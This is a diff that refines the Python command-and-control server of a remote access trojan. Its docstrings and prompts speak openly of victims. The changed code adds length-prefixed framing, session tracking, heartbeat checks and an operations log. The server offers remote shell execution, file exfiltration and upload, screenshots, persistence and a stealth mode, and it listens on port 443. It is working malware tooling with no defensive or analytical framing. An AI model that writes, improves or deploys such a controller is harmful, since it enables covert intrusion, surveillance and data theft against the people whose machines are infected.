@@ -5,8 +5,9 @@ import json
 import zlib
 import hashlib
 import os
-from time import sleep
+import time
 from pathlib import Path
+from datetime import datetime
 
 
 class RatC2(cmd.Cmd):
@@ -17,181 +18,271 @@ class RatC2(cmd.Cmd):
         self.sessions = {}
         self.current_session = None
         self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.listener.bind((host, port))
         self.listener.listen(5)
         self.running = True
+        self.log_file = "c2_operations.log"
 
         threading.Thread(target=self.accept_connections, daemon=True).start()
         threading.Thread(target=self.heartbeat_check, daemon=True).start()
+        self._log("C2 Server Started")
+
+    def _log(self, message):
+        """Log operations with timestamp"""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(self.log_file, "a") as f:
+            f.write(f"[{timestamp}] {message}\n")
+
+    def _receive_data(self, conn, timeout=30):
+        """Receive length-prefixed data with timeout"""
+        try:
+            conn.settimeout(timeout)
+            raw_len = conn.recv(4)
+            if not raw_len:
+                return None
+            msg_len = int.from_bytes(raw_len, 'big')
+            data = bytearray()
+            while len(data) < msg_len:
+                packet = conn.recv(min(4096, msg_len - len(data)))
+                if not packet:
+                    return None
+                data.extend(packet)
+            return bytes(data)
+        except Exception as e:
+            self._log(f"Receive error: {str(e)}")
+            return None
+
+    def _send_data(self, conn, data):
+        """Send length-prefixed data"""
+        try:
+            if isinstance(data, str):
+                data = data.encode()
+            conn.sendall(len(data).to_bytes(4, 'big') + data)
+            return True
+        except Exception as e:
+            self._log(f"Send error: {str(e)}")
+            return False
 
     def accept_connections(self):
-        """Handle multiple incoming victim connections"""
+        """Handle incoming connections with protocol handshake"""
         while self.running:
             try:
                 client, addr = self.listener.accept()
-                session_id = client.recv(1024).decode()  # Receive initial handshake
+                client.settimeout(10)
+
+                # Receive session ID
+                session_id = self._receive_data(client).decode()
+                if not session_id:
+                    client.close()
+                    continue
+
+                # Receive system info
+                info_data = self._receive_data(client)
+                if not info_data:
+                    client.close()
+                    continue
+
+                try:
+                    info = json.loads(info_data.decode())
+                except json.JSONDecodeError:
+                    client.close()
+                    continue
+
                 self.sessions[session_id] = {
                     'socket': client,
                     'address': addr,
-                    'info': None
+                    'info': info,
+                    'last_seen': time.time()
                 }
-                print(f"\n[+] New connection from {addr[0]} (ID: {session_id})")
-                self.get_session_info(session_id)
-            except Exception as e:
-                if self.running: print(f"Connection error: {str(e)}")
 
-    def get_session_info(self, session_id):
-        """Get system information from new session"""
-        try:
-            client = self.sessions[session_id]['socket']
-            data = self._receive_data(client)
-            self.sessions[session_id]['info'] = json.loads(data.decode())
-            print(f"[*] Registered session {session_id}")
-        except Exception as e:
-            print(f"Session setup failed: {str(e)}")
+                self._log(f"New session: {session_id[:6]} from {addr[0]}")
+                print(f"\n[+] New session {session_id[:6]} ({info['os']} - {info['hostname']})")
+
+                if not self.current_session:
+                    self.do_switch(session_id[:6])
+
+            except Exception as e:
+                if self.running:
+                    self._log(f"Connection error: {str(e)}")
 
     def do_sessions(self, arg):
         """List all active sessions"""
         print("\nActive Sessions:")
         for sid, session in self.sessions.items():
-            info = session['info'] or {}
-            print(f" {sid[:6]} | {info.get('os', 'Unknown')} | {info.get('hostname', 'Unknown')}")
+            info = session['info']
+            status = "Active" if time.time() - session['last_seen'] < 60 else "Stale"
+            print(f" {sid[:6]} | {info['os']:7} | {info['hostname']:15} | {status}")
 
     def do_switch(self, arg):
-        """Switch active session: switch <session_id>"""
-        if arg in self.sessions:
-            self.current_session = arg
-            info = self.sessions[arg]['info']
-            self.prompt = f"RAT ({info['hostname']})> "
-            print(f"Switched to session {arg[:6]}")
-        else:
-            print("Invalid session ID")
+        """Switch active session: switch <session_id_prefix>"""
+        if not arg:
+            print("Current session:", self.current_session[:6] if self.current_session else "None")
+            return
+
+        matches = [sid for sid in self.sessions if sid.startswith(arg)]
+        if not matches:
+            print("No matching sessions")
+            return
+
+        if len(matches) > 1:
+            print("Multiple matches:")
+            for sid in matches:
+                print(f" - {sid[:6]}")
+            return
+
+        self.current_session = matches[0]
+        info = self.sessions[self.current_session]['info']
+        self.prompt = f"RAT ({info['hostname']})> "
+        print(f"Switched to session {self.current_session[:6]}")
 
     def do_shell(self, arg):
         """Execute command on victim: shell <command>"""
-        if not self._check_session(): return
-        self._send_command(f'shell {arg}')
-        response = self._receive_data()
-        print(response.decode())
+        if not self._validate_session():
+            return
+
+        response = self._send_command(f"CMD {arg}")
+        if response:
+            print(response.decode())
 
     def do_download(self, arg):
         """Download file from victim: download <remote_path>"""
-        if not self._check_session(): return
-        self._send_command(f'download {arg}')
-        self._receive_file(arg)
+        if not self._validate_session():
+            return
+
+        response = self._send_command(f"DL {arg}")
+        if response and response.decode() == "READY":
+            self._receive_file(arg.split('/')[-1])
 
     def do_upload(self, arg):
         """Upload file to victim: upload <local_path> <remote_path>"""
-        if not self._check_session(): return
+        if not self._validate_session():
+            return
+
         try:
-            local, remote = arg.split()
-            self._send_command(f'upload {remote}')
-            self._send_file(local)
+            local, remote = arg.split(maxsplit=1)
+            if not Path(local).exists():
+                print("Local file not found")
+                return
+
+            response = self._send_command(f"UL {remote}")
+            if response and response.decode() == "READY":
+                self._send_file(local)
         except ValueError:
             print("Usage: upload <local_path> <remote_path>")
 
     def do_screenshot(self, arg):
         """Take and download screenshot: screenshot [filename]"""
-        if not self._check_session(): return
-        filename = arg or f"screenshot_{self.current_session[:4]}.jpg"
-        self._send_command('screenshot')
-        self._receive_file(filename)
+        if not self._validate_session():
+            return
+
+        filename = arg or f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+        response = self._send_command("SCREENSHOT")
+        if response and response.decode() == "READY":
+            self._receive_file(filename)
 
     def do_persist(self, arg):
         """Install persistence mechanism: persist [method]"""
-        if not self._check_session(): return
-        self._send_command(f'persist {arg}')
-        print(self._receive_data().decode())
+        if not self._validate_session():
+            return
+
+        response = self._send_command(f"PERSIST {arg}")
+        print(response.decode())
 
     def do_stealth(self, arg):
-        """Toggle stealth mode: stealth [on/off]"""
-        if not self._check_session(): return
-        self._send_command(f'stealth {arg}')
-        print(self._receive_data().decode())
+        """Toggle stealth mode: stealth <on|off>"""
+        if not self._validate_session():
+            return
+
+        response = self._send_command(f"STEALTH {arg.lower()}")
+        print(response.decode())
 
     def do_kill(self, arg):
         """Remove RAT from victim: kill"""
-        if not self._check_session(): return
-        self._send_command('kill')
-        del self.sessions[self.current_session]
+        if not self._validate_session():
+            return
+
+        self._send_command("KILL")
+        print("Sent kill command")
+        self.sessions.pop(self.current_session, None)
         self.current_session = None
-        print("Session terminated")
 
     def _send_command(self, cmd):
-        """Send command with protocol framing"""
-        client = self.sessions[self.current_session]['socket']
-        data = cmd.encode()
-        client.sendall(len(data).to_bytes(4, 'big') + data)
-
-    def _receive_data(self, client=None):
-        """Receive data with protocol framing"""
-        client = client or self.sessions[self.current_session]['socket']
-        size = int.from_bytes(client.recv(4), 'big')
-        received = b''
-        while len(received) < size:
-            chunk = client.recv(min(4096, size - len(received)))
-            if not chunk: break
-            received += chunk
-        return received
+        """Send command and return response"""
+        try:
+            client = self.sessions[self.current_session]['socket']
+            if not self._send_data(client, cmd):
+                return None
+            return self._receive_data(client)
+        except Exception as e:
+            print(f"Command failed: {str(e)}")
+            return None
 
     def _send_file(self, local_path):
-        """Enhanced file upload with verification"""
+        """Secure file upload with verification"""
         client = self.sessions[self.current_session]['socket']
         try:
-            # Send metadata
             file_hash = self._calculate_hash(local_path)
+            file_size = os.path.getsize(local_path)
             metadata = json.dumps({
                 'name': os.path.basename(local_path),
-                'size': os.path.getsize(local_path),
+                'size': file_size,
                 'hash': file_hash
-            }).encode()
-            client.sendall(metadata)
+            })
 
-            # Wait for ACK
-            if client.recv(3) != b'ACK':
-                raise Exception("No ACK received")
+            if not self._send_data(client, metadata):
+                return
 
-            # Send compressed file
+            ack = self._receive_data(client)
+            if ack != b"ACK":
+                print("Upload aborted")
+                return
+
             with open(local_path, 'rb') as f:
                 while True:
                     chunk = f.read(4096)
-                    if not chunk: break
+                    if not chunk:
+                        break
                     compressed = zlib.compress(chunk)
-                    client.sendall(compressed)
+                    if not self._send_data(client, compressed):
+                        break
 
-            # Verify transfer
-            client.sendall(b'VER')
-            response = client.recv(64).decode()
-            if response != file_hash:
-                raise Exception("Hash mismatch")
-            print(f"File {local_path} uploaded successfully")
+            verification = self._receive_data(client)
+            if verification.decode() == file_hash:
+                print(f"File {local_path} uploaded successfully")
+                self._log(f"File uploaded: {local_path}")
+            else:
+                print("Upload verification failed")
 
         except Exception as e:
             print(f"Upload failed: {str(e)}")
 
     def _receive_file(self, filename):
-        """Enhanced file download with validation"""
+        """Secure file download with validation"""
         client = self.sessions[self.current_session]['socket']
         try:
-            # Receive metadata
-            metadata = json.loads(self._receive_data().decode())
-            client.sendall(b'ACK')
+            metadata = json.loads(self._receive_data(client).decode())
+            if not self._send_data(client, b"ACK"):
+                return
 
-            # Receive compressed data
             received = 0
             file_hash = hashlib.sha256()
             with open(filename, 'wb') as f:
                 while received < metadata['size']:
-                    chunk = zlib.decompress(self._receive_data(client))
+                    data = self._receive_data(client)
+                    if not data:
+                        break
+                    chunk = zlib.decompress(data)
                     f.write(chunk)
                     file_hash.update(chunk)
                     received += len(chunk)
 
-            # Verify hash
-            if file_hash.hexdigest() != metadata['hash']:
+            if file_hash.hexdigest() == metadata['hash']:
+                print(f"File {filename} downloaded ({metadata['size']} bytes)")
+                self._log(f"File downloaded: {filename}")
+            else:
                 os.remove(filename)
-                raise Exception("File corrupted")
-            print(f"File {filename} downloaded ({metadata['size']} bytes)")
+                print("Download verification failed")
 
         except Exception as e:
             print(f"Download failed: {str(e)}")
@@ -202,37 +293,60 @@ class RatC2(cmd.Cmd):
         with open(path, 'rb') as f:
             while True:
                 chunk = f.read(4096)
-                if not chunk: break
+                if not chunk:
+                    break
                 sha.update(chunk)
         return sha.hexdigest()
 
     def heartbeat_check(self):
-        """Maintain active connections"""
+        """Maintain active connections and remove dead sessions"""
         while self.running:
-            for sid in list(self.sessions.keys()):
+            dead_sessions = []
+            for sid, session in self.sessions.items():
                 try:
-                    self.sessions[sid]['socket'].sendall(b'<HEARTBEAT>')
+                    if time.time() - session['last_seen'] > 120:
+                        session['socket'].close()
+                        dead_sessions.append(sid)
+                    else:
+                        self._send_data(session['socket'], "PING")
+                        pong = self._receive_data(session['socket'], timeout=5)
+                        if pong == b"PONG":
+                            session['last_seen'] = time.time()
                 except:
-                    del self.sessions[sid]
-                    if sid == self.current_session:
-                        self.current_session = None
-            sleep(30)
+                    dead_sessions.append(sid)
 
-    def _check_session(self):
+            for sid in dead_sessions:
+                self.sessions.pop(sid, None)
+                self._log(f"Session expired: {sid[:6]}")
+                if sid == self.current_session:
+                    self.current_session = None
+
+            time.sleep(30)
+
+    def _validate_session(self):
+        """Check if current session is valid"""
         if not self.current_session:
             print("No active session selected")
+            return False
+        if self.current_session not in self.sessions:
+            print("Session no longer exists")
+            self.current_session = None
             return False
         return True
 
     def do_exit(self, arg):
-        """Exit C2 server"""
+        """Exit C2 server gracefully"""
         self.running = False
         for sid in list(self.sessions.keys()):
             self.sessions[sid]['socket'].close()
         self.listener.close()
+        self._log("C2 Server Stopped")
         return True
+
+    def emptyline(self):
+        pass
 
 
 if __name__ == '__main__':
-    print("Starting Enhanced RAT C2 Server...")
+    print("Starting Advanced RAT C2 Server...")
     RatC2('0.0.0.0', 443).cmdloop()
